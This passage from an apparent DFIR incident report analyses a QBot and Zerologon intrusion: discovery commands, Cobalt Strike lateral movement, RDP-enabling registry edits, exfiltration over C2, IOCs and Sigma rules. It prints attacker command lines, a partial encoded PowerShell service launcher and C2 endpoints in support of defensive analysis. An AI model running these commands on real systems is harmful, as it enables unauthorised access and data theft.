Certificate Information:\n  - Certificate Issuer Name:\n  - Certificate Serial Number:\n  - Certificate Thumbprint:\n  \n  Certificate information is only provided if a certificate was used for pre-authentication.\n  Pre-authentication types, ticket options, encryption types and result codes are defined in RFC 4120.\n```\n\n### Discovery\n\nQBot initially starts a number of processes to collect information about the affected system. This is part of the “SYSTEM INFO” bot request, as described in a recent article from SecureList.\n\n```image\nAlt: System Info\nDescription: The image displays a table containing data related to system commands executed during a cybersecurity event. It includes columns for 'ParentImage,' 'CommandLine,' and 'TaskCategory,' listing various commands such as 'whoami /all,' 'ipconfig /all,' and 'nslookup.' Each command is associated with the 'explorer.exe' process, indicating that these commands are part of the discovery phase in a potential attack, reflecting the operational tactics used to gather information about the affected system and network.\nTranscription: |\n  | ParentImage         | CommandLine                                              | TaskCategory                         |\n  | ------------------- | -------------------------------------------------------- | ------------------------------------ |\n  | C:\\Windows\\SysWOW64 | whoami /all                                              | Process Create (rule: ProcessCreate) |\n  | C:\\Windows\\SysWOW64 | cmd /c set                                               | Process Create (rule: ProcessCreate) |\n  | C:\\Windows\\SysWOW64 | ipconfig /all                                            | Process Create (rule: ProcessCreate) |\n  | C:\\Windows\\SysWOW64 | net view /all                                            | Process Create (rule: ProcessCreate) |\n  | C:\\Windows\\SysWOW64 | nslookup -querytype=ALL -timeout=10 _ldap._tcp.dc._msdc. | Process Create (rule: ProcessCreate) |\n  | C:\\Windows\\SysWOW64 | net share                                                | Process Create (rule: ProcessCreate) |\n  | C:\\Windows\\SysWOW64 | route print                                              | Process Create (rule: ProcessCreate) |\n  | C:\\Windows\\SysWOW64 | netstat -nao                                             | Process Create (rule: ProcessCreate) |\n  | C:\\Windows\\SysWOW64 | net localgroup                                           | Process Create (rule: ProcessCreate) |\n```\n\nLater, more discovery commands were executed via the Cobalt Strike beacon, which gathered information about the active directory environment.\n\n```image\nAlt: Active Directory Discovery\nDescription: The image depicts a table detailing command-line activities related to process creation on a Windows system. It includes columns for 'ParentImage', 'CommandLine', and 'TaskCategory', showing various commands executed, such as retrieving group information from a domain and executing a ping command. This information is relevant for understanding the investigative steps taken during a cybersecurity incident involving QBot.\nTranscription: |\n  | ParentImage                      | CommandLine                                                                               | TaskCategory                         |\n  | -------------------------------- | ----------------------------------------------------------------------------------------- | ------------------------------------ |\n  | C:\\Windows\\SysWOW64\\explorer.exe | net group \"domain admins\" /domain                                                         | Process Create (rule: ProcessCreate) |\n  | C:\\Windows\\SysWOW64\\explorer.exe | net group \"domain controllers\" /domain                                                    | Process Create (rule: ProcessCreate) |\n  | C:\\Windows\\SysWOW64\\explorer.exe | C:\\Windows\\system32\\cmd.exe /C c:\\windows\\sysnative\\nltest.exe /domain_trusts /all_trusts | Process Create (rule: ProcessCreate) |\n  | C:\\Windows\\SysWOW64\\explorer.exe | C:\\Windows\\system32\\cmd.exe /C ping -n 1                                                  | Process Create (rule: ProcessCreate) |\n```\n\n#### ADFind (renamed in find.exe) used to enumerate computers\n\n```\nC:\\redacted\\find.exe  -f objectcategory=computer -csv name cn OperatingSystem dNSHostName\n```\n\n```image\nAlt: ADFind\nDescription: The image displays technical information about the tool 'find.exe', which is known as AdFind. It includes details such as the file version (1.52.0.5064), product name (AdFind), company (www.joeware.net), original file name (AdFind.exe), and the command line used to execute the tool. The command line demonstrates how the tool is utilized to enumerate computer objects in an Active Directory environment, specifically fetching attributes like name, common name (cn), operating system, and DNS host name in CSV format.\nTranscription: |\n  Image:                find.exe\n  FileVersion:          1.52.0.5064\n  Description:          -\n  Product:              AdFind\n  Company:              www.joeware.net\n  OriginalFileName:     AdFind.exe\n  CommandLine:          C:\\find.exe -f objectcategory=computer -csv name cn OperatingSystem dNSHostName\n```\n\nOn the Domain Controller, the threat actors gathered information about the installed security software through WMI:\n\n```image\nAlt: WMI Query\nDescription: The image displays a table containing process creation logs related to a Windows environment. It includes columns for 'ParentImage,' 'CommandLine,' and 'TaskCategory.' The 'ParentImage' column indicates the use of PowerShell, while the 'CommandLine' column shows various commands executed via cmd.exe to query security software components using Windows Management Instrumentation (WMI). The 'TaskCategory' column specifies that these actions are categorized as 'Process Create.' This data is relevant for understanding the actions taken by threat actors during a domain compromise.\nTranscription: |\n  | ParentImage                                               | CommandLine                                                                                              | TaskCategory                         |\n  | --------------------------------------------------------- | -------------------------------------------------------------------------------------------------------- | ------------------------------------ |\n  | C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe | C:\\Windows\\system32\\cmd.exe /C wmic /namespace:\\\\root\\SecurityCenter2 PATH AntiSpywareProduct GET /value | Process Create (rule: ProcessCreate) |\n  | C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe | C:\\Windows\\system32\\cmd.exe /C wmic /namespace:\\\\root\\SecurityCenter2 PATH AntiVirusProduct GET /value   | Process Create (rule: ProcessCreate) |\n  | C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe | C:\\Windows\\system32\\cmd.exe /C wmic /namespace:\\\\root\\SecurityCenter2 PATH FirewallProduct GET /value    | Process Create (rule: ProcessCreate) |\n```\n\n```\nC:\\Windows\\system32\\cmd.exe /C wmic /namespace:\\\\root\\SecurityCenter2 PATH AntiSpywareProduct GET /value\nC:\\Windows\\system32\\cmd.exe /C wmic /namespace:\\\\root\\SecurityCenter2 PATH AntiVirusProduct GET /value\nC:\\Windows\\system32\\cmd.exe /C wmic /namespace:\\\\root\\SecurityCenter2 PATH FirewallProduct GET /value\n```\n\n#### Ping was used to verify machines were online\n\n```\nping -n 1 [REDACTED]\n```\n\n### Lateral Movement\n\nThrough the creation of Windows services, Cobalt Strike Beacons (psexec_psh function) were deployed on multiple hosts within the environment.\n\n```\nEventCode: 7045\nService File Name: %COMSPEC% /b /c start /b /min powershell -nop -w hidden -encodedcommand <redacted>\nUser: NT AUTHORITY\\SYSTEM\nParentImage: C:\\Windows\\System32\\services.exe\nParentCommandLine: C:\\Windows\\system32\\services.exe\n```\n\nOn the first Domain Controller, a Cobalt Strike service was installed:\n\n```image\nAlt: Cobalt Strike Service\nDescription: The image displays a Windows Event Log entry with details about a service installation related to a Cobalt Strike operation. Key information includes the EventCode (7045), indicating a service was installed, the Service File Name which shows the command executed (including PowerShell and an encoded command), the User account under which the service was created (LocalSystem), and other attributes like the ComputerName and types of the service. This log entry is crucial for understanding the lateral movement of malware in a network.\nTranscription: |\n  LogName: System\n  EventCode: 7045\n  EventType: 4\n  ComputerName: <redacted>\n  User: NOT_TRANSLATED\n  SidType: 0\n  SourceName: Microsoft-Windows-Service Control Manager\n  Type: Information\n  RecordNumber: 2730\n  TaskCategory: None\n  OpCode: The operation completed successfully.\n  Message: A service was installed in the system.\n  \n  Service Name: af5ff02\n  Service File Name: %COMSPEC% /b /c start /b /min powershell -nop -w hidden -encodedcommand JABzADOATgB1AHcALQBpAGMAdABlAG8AQgB5AFMAZABhAGUAYQBuAGQAYQAgAGUAbgB0AGUAcgB0AGUAcgB0AGUAcgB0AGUAcgB...\n```\n\n```\nLog Source: Microsoft-Windows-Service Control Manager Event ID:7045\n```\n\nMultiple services were installed by Cobalt Strike across the environment, here are a few examples:\n\n```\nHKLM\\System\\CurrentControlSet\\Services\\3141131\\ImagePath\nHKLM\\System\\CurrentControlSet\\Services\\af5ff02\\ImagePath\nHKLM\\System\\CurrentControlSet\\Services\\c46234f\\ImagePath\n```\n\nCobalt Strike first calls `OpenSCManagerW` to create the service remotely, then starts it with `StartServiceA` function:\n\n```image\nAlt: Service Creation\nDescription: The image displays a network packet capture related to the execution of the `OpenSCManagerW` and `StartServiceA` functions, which are part of the Cobalt Strike malware's lateral movement technique. The upper part shows timestamps, source, and destination ports, indicating communication between a compromised host and a domain controller. The lower part provides detailed information about the captured frame, including frame size, Ethernet II details, and the Internet Protocol version 4 data. This image contains technical details pertinent to cyber threat analysis.\nTranscription: |\n  Frame 1306464: 194 bytes on wire (1552 bits), 194 bytes captured (1552 bits)\n  Ethernet II, Src: <redacted>, Dst: <redacted>\n  Internet Protocol Version 4, Src: BeachHead IP, Dst: DC IP\n  Transmission Control Protocol, Src Port: 61768, Dst Port: 49729, Seq: 14613, Ack: 679, Len: 140\n  Distributed Computing Environment / Remote Procedure Call (DCE/RPC) Request, Fragment: Single, Fragment Offset: 0\n  ```\n  \n  ```\n  17:15:47.907308 61768 SVCCtl OpenSCManagerW request\n  17:15:47.908686 49729 SVCCtl OpenSCManagerW response\n  17:15:47.914445 49729 SVCCtl Unknown operation 60 response\n  17:15:47.915546 61768 SVCCtl StartServiceA request\n  17:15:48.031885 49729 SVCCtl StartServiceA response\n```\n\n#### RDP/interactive Logins\n\nVarious commands were executed to enable the RDP service on various hosts:\n\nIncrease the max RDP connections allowed, in this case a arbitrarily large number.\n\n```\nREG  ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /t REG_DWORD /v \"MaxInstanceCount\" /d 0xffffffff /f\n```\n\nMakes sure the RDP listener is enabled.\n\n```\nREG  ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /t REG_DWORD /v \"fEnableWinStation\" /d 1 /f\n```\n\nMakes sure the user is allowed to RDP to the terminal server.\n\n```\nREG  ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /t REG_DWORD /v \"TSUserEnabled\" /d 0 /f\n```\n\nMakes sure the terminal server is set to enabled.\n\n```\nREG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /t REG_DWORD /v \"TSEnabled\" /d 1 /f\n```\n\nMakes sure terminal services is set to remote admin mode.\n\n```\nREG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /t REG_DWORD /v \"TSAppCompat\" /d 0 /f\n```\n\nMakes sure that the terminal service will start idle sessions.\n\n```\nREG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /t REG_DWORD /v \"IdleWinStationPoolCount\" /d 1 /f\n```\n\nEnables advertisement of the terminal server.\n\n```\nREG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /t REG_DWORD /v \"TSAdvertise\" /d 1 /f\n```\n\nMakes sure terminal server is set to allow connections.\n\n```\nREG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /t REG_DWORD /v \"AllowTSConnections\" /d 1 /f\n```\n\nMakes sure terminal server is set to simultaneous sessions.\n\n```\nREG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Licensing Core\" /t REG_DWORD /v \"EnableConcurrentSessions\" /d 1 /f\n```\n\nStarts the terminal services and sets service to autostart.\n\n```\nsc config termservice start= auto\nnet  start termservice /y\n```\n\nThe threat actor then established interactive administrative RDP sessions and pivoted to different hosts in the network.\n\n```image\nAlt: RDP Sessions\nDescription: The image displays a detailed security log entry from a Windows environment, indicating a successful logon event (EventCode=4624) related to Remote Desktop Protocol (RDP). It includes specific logon information such as the security ID, account name, account domain, logon type, and process information. The log indicates that an account was successfully logged on, with notable details about the administrator account used, including its security ID, logon ID, and the process associated with the logon (svchost.exe). This log serves as a crucial piece of information in the context of lateral movement and potential domain compromise scenarios.\nTranscription: |\n  LogName=Security\n  EventCode=4624\n  EventType=0\n  ComputerName=************\n  SourceName=Microsoft Windows security auditing.\n  Type=Information\n  RecordNumber=12572\n  Keywords=Audit Success\n  TaskCategory=Logon\n  OpCode=Info\n  Message=An account was successfully logged on.\n  \n  Subject:\n      Security ID: S-1-5-18\n      Account Name: ************\n      Account Domain: ************\n      Logon ID: 0x3E7\n  \n  Logon Information:\n      Logon Type: 10\n      Restricted Admin Mode: No\n      Virtual Account: No\n      Elevated Token: Yes\n  \n  Impersonation Level: Impersonation\n  \n  New Logon:\n      Security ID: S-1-5-21-853439379-3680187918-914908032-500\n      Account Name: Administrator\n      Account Domain: ************\n      Logon ID: 0x1213E97\n      Linked Logon ID: 0x0\n      Network Account Name: -\n      Network Account Domain: -\n      Logon GUID: {56eb6b07-4091-d736-d28e-f8ef8d0dc9158}\n  \n  Process Information:\n      Process ID: 0x3c\n      Process Name: C:\\Windows\\System32\\svchost.exe\n```\n\n```\nLogName=Security\nEventCode=4624\nLogon Type=10 (Remote Interactive Logon - RDP)\n```\n\n### Named pipe (SMB)\n\nThe base64 encoded payload can be decoded using this Cyberchef recipe (shout out @0xtornado) which represents a SMB beacon that creates the named pipe “dce_3d”.\n\n```image\nAlt: SMB Beacon\nDescription: The image shows the output of a CyberChef operation, displaying a base64 decoded payload. The highlighted portion indicates the creation of a named pipe named \"dce_3d\". The surrounding text contains garbled data, typical of decoded binary payloads, potentially representing an SMB beacon.\nTranscription: |\n  üè....`à1òd.R0.R..R.r( .J&1y1A¬<a|, ÁÏ\n  ,ÇàRW.R..B<.D.@x.AtJ.DP.H..X .óá<1.4..Ó1y1¬ÁÍ\n  .Cçàu0.j; }$uÀ.xS.6f.K.x..ó...D.$$$[[ayZQyàX_Z..ë.1]Àj@h....hyÿ..j.hX¤SâyÖPé´...z1éQqh.°..h..°j.j.RhEpÔyÖP..$i.Rh(o)áyÖ.Atnj.j.j..æ.Æ..Â.|$..9At.hòµçVyÖyd$.èsyÿ\\\\.\\pipe\\dce_3d .i .\n```\n\n```image\nAlt: Named Pipe\nDescription: The image displays a log entry related to the creation of a named pipe in a Windows environment. It contains various fields such as LogName, EventCode, ComputerName, User, and more, with specific values indicating the details of the event. Notably, it shows that a pipe named '\\dce_3d' was created by a process with ID 396, which is associated with PowerShell. The log entry format is typical for Windows event logs, providing crucial information for cybersecurity analysis.\nTranscription: |\n  LogName=Microsoft-Windows-Sysmon/Operational\n  EventCode=17\n  EventType=4\n  ComputerName=XXXXXXXX\n  User=NOT_TRANSLATED\n  Sid=S-1-5-18\n  SidType=0\n  SourceName=Microsoft-Windows-Sysmon\n  Type=Information\n  RecordNumber=43747\n  Keywords=None\n  TaskCategory=Pipe Created (rule: PipeEvent)\n  OpCode=Info\n  Message=Pipe Created:\n  RuleName=-\n  EventType=CreatePipe\n  UtcTime=\n  ProcessGuid={3acf9a2a-953e-6192-cd20-00000000000300}\n  ProcessId=396\n  PipeName=\\dce_3d\n  Image: C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe\n```\n\n```\nLogName=Microsoft-Windows-System/Operational\nEventCode=17\nTaskCategory=Pipe Created (rule: PipeEvent)\n```\n\n### Command and Control\n\n#### QBot details – 24.229.150.54 // 41.228.22.180\n\n24.229.150[.]54:995 / avlhestito[.]us\n\n```\nCertificate: 25:a6:ef:79:48:98:54:ee:bb:a6:bd:10:ee:c1:f2:0a:00:ad:ac:ce\nNot Before  2021/11/15 09:24:49 UTC\nNot After  2022/11/15 13:18:32 UTC\nIssuer Org  Rsc Inpye LLC.\nSubject Common  avlhestito[.]us\nPublic Algorithm  rsaEncryption\nJA3: c35a61411ee5bdf666b4d64b05c29e64\nJA3s: 7c02dbae662670040c7af9bd15fb7e2f\n```\n\n41.228.22[.]180:443 / xrhm[.]info\n\n```\nCertificate:\t96:39:a9:52:e9:9a:1e:29:c5:dc:b3:72:01:29:74:c4:87:db:15:d7\nNot \tBefore:  2021/11/12 04:34:10 UTC\nNot After:  \t2022/11/12 10:08:57 UTC\nIssuer Org:  Bqatra Bamito Inc.\nSubject Common:  xrhm[.]info\nPublic Algorithm:  rsaEncryption\nJA3:  c35a61411ee5bdf666b4d64b05c29e64\nJA3s: 7c02dbae662670040c7af9bd15fb7e2f\n```\n\nHere is the initial access DLL (Qbot) information from Tria.ge\n\n```image\nAlt: Qbot DLL\nDescription: The image displays a table containing details about Qakbot (QBot) operations. It includes columns for Family, Version, Botnet, Campaign, and a list of Command and Control (C2) IP addresses with their corresponding ports. Each row represents a different C2 address associated with Qakbot, showcasing the botnet's operational infrastructure.\nTranscription: |\n  Family: qakbot\n  Version: 402.363\n  Botnet: tr\n  Campaign: 1633597626\n  \n  C2:\n  120.150.218.241:995\n  89.137.52.44:443\n  86.8.177.143:443\n  174.54.139.186:443\n  188.50.169.158:443\n  140.82.49.12:443\n  81.241.252.59:2078\n  209.50.20.255:443\n  200.232.214.222:995\n  2.222.167.138:443\n  122.11.220.212:2222\n  47.22.148.6:443\n  217.17.56.163:465\n  94.200.181.154:443\n  201.93.111.2:995\n  89.101.97.139:443\n  188.55.235.118:995\n  181.118.183.94:443\n  186.32.163.199:443\n  76.25.142.196:443\n  98.157.235.126:443\n  73.151.236.31:443\n  75.75.179.226:443\n  67.165.206.193:993\n  72.252.201.69:443\n  185.250.148.74:443\n  66.103.170.104:2222\n  216.201.162.158:443\n  103.123.42.115:2222\n  124.123.42.115:2222\n  199.27.127.129:443\n  209.142.97.161:995\n  73.236.205.91:443\n  103.142.10.177:443\n  41.228.22.180:443\n  78.191.58.219:995\n  74.72.237.54:443\n  96.57.188.174:2078\n  37.210.152.224:995\n  202.134.178.157:443\n  73.52.50.32:443\n  27.223.92.142:995\n  136.236.74.70:443\n  72.173.78.211:443\n  45.46.53.140:2222\n  173.21.10.71:2222\n  71.74.12.34:443\n  167.48.117.81:443\n  47.40.196.233:2222\n  181.4.53.6:465\n```\n\n#### Cobalt Strike details – 5.255.98[.]144\n\nThis Cobalt Strike server was added to our Threat Feed on 2021-11-16.\n\n5.255.98.144:8888 / 5.255.98.144:443 / 5.255.98.144:8080 / dxabt[.]com\n\n```\nCertificate: [25:fe:be:6d:0e:8d:48:5a:94:cf:46:84:d7:7e:ff:bf:47:aa:04:5c ]\nNot Before: 2021/11/07 03:00:53 UTC  \t\nNot After: 2022/02/05 03:00:52 UTC  \t\nIssuer Org: Let's Encrypt  \t\nSubject Common: dxabt[.]com [dxabt[.]com,ns1.dxabt[.]com,ns2.dxabt[.]com,ns3.dxabt[.]com,ns4.dxabt[.]com\nPublic Algorithm: rsaEncryption\nJA3: 0eecb7b1551fba4ec03851810d31743f\nJA3s: ae4edc6faf64d08308082ad26be60767\n```\n\nConfig:\n\n```\n{\n    \"x64\": {\n        \"uri_queried\": \"/tRPG\",\n        \"sha256\": \"dec25fc2fe7e76fe191fbfdf48588c4325f52bfe2769fbc88a5614541c1075eb\",\n        \"config\": {\n            \"HTTP Method Path 2\": \"/faq\",\n            \"Jitter\": 79,\n            \"C2 Server\": \"dxabt[.]com,/case\",\n            \"Spawn To x86\": \"%windir%\\\\syswow64\\\\runonce.exe\",\n            \"Method 1\": \"GET\",\n            \"C2 Host Header\": \"\",\n            \"Method 2\": \"POST\",\n            \"Watermark\": 426352781,\n            \"Spawn To x64\": \"%windir%\\\\sysnative\\\\runonce.exe\",\n            \"Beacon Type\": \"8 (HTTPS)\",\n            \"Port\": 443,\n            \"Polling\": 53988\n        },\n        \"time\": 1637416040175.3,\n        \"md5\": \"30cc71d5b5d7778774c54486558690d3\",\n        \"sha1\": \"5f36c6cffdbae0d631c8889b4d9bad1248f899b3\"\n    },\n    \"x86\": {\n        \"uri_queried\": \"/Mr0m\",\n        \"sha256\": \"a992d57b2f6164e599952ea3c245962824ad17166684ed45e987efe80ebe611f\",\n        \"config\": {\n            \"HTTP Method Path 2\": \"/faq\",\n            \"Jitter\": 79,\n            \"C2 Server\": \"dxabt[.]com,/case\",\n            \"Spawn To x86\": \"%windir%\\\\syswow64\\\\runonce.exe\",\n            \"Method 1\": \"GET\",\n            \"C2 Host Header\": \"\",\n            \"Method 2\": \"POST\",\n            \"Watermark\": 426352781,\n            \"Spawn To x64\": \"%windir%\\\\sysnative\\\\runonce.exe\",\n            \"Beacon Type\": \"8 (HTTPS)\",\n            \"Port\": 443,\n            \"Polling\": 53988\n        },\n        \"time\": 1637416038974.9,\n        \"md5\": \"c1fd49c043894c1dff8bc02b17f8942c\",\n        \"sha1\": \"e915f74be310b1687db6b290af2f78583a981512\"\n    }\n}\n```\n\n### Exfiltration\n\nWhile the threat actors were active in the environment, we received 3 different alerts stating that someone had opened canary documents from the IP address 91.193.182[.]165. These alerts tell us that data was indeed exfiltrated from the environment.\n\n```image\nAlt: Canary Documents\nDescription: The image displays a code snippet featuring details about an IP address (91.193.182.165). It includes information such as city (Moscow), region (Moscow), country (RU), geographical coordinates, organization (AS12722 RECONN LLC), postal code (101000), and timezone (Europe/Moscow). This data is relevant for identifying the origin of suspicious activities in a cybersecurity context.\nTranscription: |\n  ip: \"91.193.182.165\"\n  city: \"Moscow\"\n  region: \"Moscow\"\n  country: \"RU\"\n  loc: \"55.7522,37.6156\"\n  org: \"AS12722 RECONN LLC\"\n  postal: \"101000\"\n  timezone: \"Europe/Moscow\"\n```\n\nThe threat actors were most interested in files concerning financial statements, ransomware reports, and salary data.\n\nThe C2 channel was encrypted and multiple connections were established with the internal file server. No other traffic was observed for possible exfiltration leading us to the conclusion that the command and control channel was used for the exfiltration.\n\n```image\nAlt: C2 Channel\nDescription: The image is a bar graph depicting the number of connections per minute from a File Server to a specified command and control IP address (5.255.98.144:8888). The x-axis represents time in UTC from 17:35 to 18:15, while the y-axis indicates the number of connections, ranging from 0 to 20. The graph shows a notable spike in connections at 17:54, which aligns with the timeframe of suspected data exfiltration, demonstrating the activity of a Cobalt Strike Beacon during that period.\nTranscription: |\n  Number of connection to 5.255.98.144:8888 from File Server per minute\n  \n  | Time  | Connections |\n  |-------|-------------|\n  | 17:36 | 1           |\n  | 17:37 | 0           |\n  | 17:38 | 0           |\n  | 17:39 | 5           |\n  | 17:40 | 0           |\n  | 17:41 | 0           |\n  | 17:42 | 0           |\n  | 17:43 | 0           |\n  | 17:44 | 0           |\n  | 17:45 | 0           |\n  | 17:46 | 0           |\n  | 17:47 | 0           |\n  | 17:48 | 0           |\n  | 17:49 | 0           |\n  | 17:50 | 0           |\n  | 17:51 | 0           |\n  | 17:52 | 0           |\n  | 17:53 | 0           |\n  | 17:54 | 18          |\n  | 17:55 | 16          |\n  | 17:56 | 14          |\n  | 17:57 | 12          |\n  | 17:58 | 10          |\n  | 17:59 | 10          |\n  | 18:00 | 10          |\n  | 18:01 | 10          |\n  | 18:02 | 10          |\n  | 18:03 | 10          |\n  | 18:04 | 10          |\n  | 18:05 | 10          |\n  | 18:06 | 10          |\n  | 18:07 | 10          |\n  | 18:08 | 10          |\n  | 18:09 | 10          |\n  | 18:10 | 10          |\n  | 18:11 | 10          |\n  | 18:12 | 10          |\n```\n\nAt 17:35 UTC, the Cobalt Strike Beacon was deployed on the File Server.\n\nAccording to the number of connections to the C2 from the File Server per minute, we can conclude that exfiltration was done between 17:52 UTC and 18:00 UTC.\n\n```image\nAlt: Exfiltration Traffic\nDescription: The image is a time series graph displaying network traffic data related to exfiltration events. The x-axis represents time in UTC, ranging from 17:52:00 to 18:00:00, while the y-axis indicates the volume of data transferred. A significant spike is visible around 17:54:00, indicating a peak in traffic from the file share server to the Cobalt Strike command and control server. The graph uses red bars to highlight the data transfer volumes, suggesting a concentrated effort of data exfiltration occurring within this time frame.\nTranscription: |\n  | Time (UTC) | Connections |\n  |------------|-------------|\n  | 17:52:00   | Low         |\n  | 17:54:00   | High        |\n  | 17:56:00   | Low         |\n  | 17:58:00   | Low         |\n  | 18:00:00   | Low         |\n```\n\nSpike in traffic from file share server to Cobalt Strike command and control server.\n\n### IOCs\n\n#### Network\n\n```\nQBOT\n24.229.150[.]54:995  - avlhestito[.]us\n41.228.22[.]180:443 - xrhm[.]info\n\nCobalt Strike\n5.255.98[.]144:8888 / dxabt[.]com\n5.255.98[.]144:443 / dxabt[.]com\n5.255.98[.]144:8080 / dxabt[.]com\n```\n\n#### File\n\n```\nIntial Exec Qbot DLL\nMD5:53510e20efb161d5b71c4ce2800c1a8d\nSHA1:2268178851d0d0debb9ab457d73af8a5e50af168\nSHA2:e2bc969424adc97345ac81194d316f58da38621aad3ca7ae27e40a8fae582987\n\nQBot DLL (extracted from registry):\nMD5:312e52b4109741893f17bc524084100f\nSHA1:7ca650945223eab088f43fd472e3592be2ed9d32\nSHA2:4d3b10b338912e7e1cbade226a1e344b2b4aebc1aa2297ce495e27b2b0b5c92b\n\ncool.exe\nMD5:59E7F22D2C290336826700F05531BD30\nSHA1:3B2A0D2CB8993764A042E8E6A89CBBF8A29D47D1\nSHA256:F63E17FF2D3CFE75CF3BB9CF644A2A00E50AAFFE45C1ADF2DE02D5BD0AE35B0\n```\n\n## Detections\n\n### Network\n\n```\nET POLICY Powershell Activity Over SMB - Likely Lateral Movement\nET POLICY Command Shell Activity Using Comspec Environmental Variable Over SMB - Very Likely Lateral Movement\nET RPC DCERPC SVCCTL - Remote Service Control Manager Access\nET CNC Feodo Tracker Reported CnC Server group 15\nET CNC Feodo Tracker Reported CnC Server group 16\n\nThe following rules may cause performance issues (and are disabled by default) according to @ET_Labs\nET EXPLOIT Possible Zerologon NetrServerReqChallenge with 0x00 Client Challenge (CVE-2020-1472) - 2030870\nET EXPLOIT Possible Zerologon NetrServerAuthenticate with 0x00 Client Credentials (CVE-2020-1472) 2030871\nET EXPLOIT [401TRG] Possible Zerologon (CVE-2020-1472) UUID flowbit set - 2030888\nET EXPLOIT [401TRG] Possible Zerologon (CVE-2020-1472) M2 - 2030889\n```\n\nNew signatures\n\n```\n2035258 - ET EXPLOIT Zerologon Phase 2/3 - NetrServerAuthenticate2 Request with 0x00 Client Challenge and Sign and Seal Disabled (CVE-2020-1472) M1\n2035259 - ET EXPLOIT Zerologon Phase 2/3 - NetrServerAuthenticate2 Request with 0x00 Client Challenge and Sign and Seal Disabled (CVE-2020-1472) M2\n2035260 - ET EXPLOIT Zerologon Phase 2/3 - NetrServerAuthenticate3 Request with 0x00 Client Challenge and Sign and Seal Disabled (CVE-2020-1472) M1\n2035261 - ET EXPLOIT Zerologon Phase 2/3 - NetrServerAuthenticate3 Request with 0x00 Client Challenge and Sign and Seal Disabled (CVE-2020-1472) M2\n2035262 - ET EXPLOIT Zerologon Phase 3/3 - Malicious NetrServerPasswordSet2 (CVE-2020-1472)\n2035263 - ET EXPLOIT Zerologon Phase 3/3 - NetrLogonSamLogonWithFlags Request with 0x00 Client Credentials (CVE-2020-1472)\n```\n\n### Sigma\n\n```\ntitle: Scheduled task executing powershell encoded payload from registry\nstatus: Experimental\ndescription: Detects the creation of a schtask that executes a base64 encoded payload stored in the Windows Registry using PowerShell.\nauthor: @Kostastsale, @TheDFIRReport\nreferences:\n  - https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/\ndate: 2022/02/12\nlogsource:\n  product: windows\n  category: process_creation\ndetection:\n  selection1:\n    Image|endswith: '\\schtasks.exe'\n    CommandLine|contains|all:\n      - '/Create'\n      - '/SC'\n  selection2:\n    CommandLine|contains|all:\n      - 'FromBase64String'\n      - 'powershell'\n      - 'Get-ItemProperty'\n      - 'HKCU:'\n  condition: selection1 and selection2\nfalsepositives:\n  - Uknown\nlevel: high\ntags:\n  - attack.execution\n  - attack.persistence\n  - attack.t1053.005\n  - attack.t1059.001\n```\n\n```\ntitle: Execution of ZeroLogon PoC executable\nstatus: Experimental\ndescription: Detects the execution of the commonly used ZeroLogon PoC executable.\nauthor: @Kostastsale, @TheDFIRReport\nreferences:\n  - https://thedfirreport.com/2021/11/01/from-zero-to-domain-admin/\n  - https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/\ndate: 2022/02/12\nlogsource:\n  product: windows\n  category: process_creation\ndetection:\n  selection1:\n    ParentImage|endswith:\n      - '\\cmd.exe'\n    Image|endswith:\n      - '\\cool.exe'\n      - '\\zero.exe'\n    CommandLine|contains|all:\n      - 'Administrator'\n      - '-c'\n  selection2:\n    CommandLine|contains|all:\n      - 'taskkill'\n      - '/f'\n      - '/im'\n  selection3:\n    CommandLine|contains:\n      - 'powershell'\n  condition: selection1 and (selection2 or selection3)\nfalsepositives:\n  - Uknown\nlevel: high\ntags:\n  - attack.execution\n  - attack.lateral_movement\n  - attack.T1210\n```\n\n```\ntitle:  Enabling RDP service via reg.exe command execution\nstatus: Experimental\ndescription: Detects the execution of reg.exe and subsequent command line arguments for enabling RDP service on the host\nauthor: @Kostastsale, @TheDFIRReport\nreferences:\n  - https://thedfirreport.com/2022/02/21/qbot-and-zerologon-lead-to-full-domain-compromise/\ndate: 2022/02/12\nlogsource:\n  product: windows\n  category: process_creation\ndetection:\n  selection1:\n    Image|endswith:\n      - '\\reg.exe'\n    CommandLine|contains|all:\n      - 'add'\n      - 'HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server'\n      - 'REG_DWORD'\n  Winstations1:\n    CommandLine|contains:\n      - 'WinStations\\RDP-Tcp'\n  Winstations2:\n    CommandLine|contains:\n      - 'MaxInstanceCount'\n      - 'fEnableWinStation'\n  selection2:\n    CommandLine|contains|all:\n      - 'Licensing Core'\n      - 'EnableConcurrentSessions'\n  selection3:\n    CommandLine|contains:\n      - 'TSUserEnabled'\n      - 'TSEnabled'\n      - 'TSAppCompat'\n      - 'IdleWinStationPoolCount'\n      - 'TSAdvertise'\n      - 'AllowTSConnections'\n      - 'fSingleSessionPerUser'\n  condition: selection1 and ((Winstations1 and Winstations2) or (selection2 or selection3))\nfalsepositives:\n  - Uknown\nlevel: high\ntags:\n  - attack.defense_evasion\n  - attack.lateral_movement\n  - attack.t1021.001\n  - attack.t1112\n```\n\n- https://github.com/SigmaHQ/sigma/blob/a502f316efdcc8c174b7cf412029dfae5b3552c8/rules/windows/builtin/security/win_pass_the_hash_2.yml\n- https://github.com/SigmaHQ/sigma/blob/940f89d43dbac5b7108610a5bde47cda0d2a643b/rules/windows/registry/registry_set/registry_set_powershell_as_service.yml\n- 